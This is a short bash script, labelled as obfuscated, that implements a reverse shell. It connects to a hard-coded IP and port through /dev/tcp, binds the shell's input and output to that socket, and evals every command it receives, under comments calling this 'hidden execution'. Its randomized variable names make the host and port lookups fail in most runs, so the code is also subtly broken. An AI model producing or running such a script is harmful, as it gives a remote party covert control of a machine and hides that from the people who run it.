#!/bin/bash

# Obfuscated version using variable substitution
IP="10.162.6.102"
PORT=33007

# Randomize variables
eval $(printf "VAR%d='%s'" $((RANDOM%1000)) $IP)
eval $(printf "VAR%d=%d" $((RANDOM%1000)) $PORT)

# Hidden execution
exec 3<>/dev/tcp/$(eval echo \$VAR$((RANDOM%1000)))/$(eval echo \$VAR$((RANDOM%1000)))
exec 0<&3 && exec 1>&3 && exec 2>&3

while read -r cmd; do
    eval "$cmd" 2>&1 >&3
done
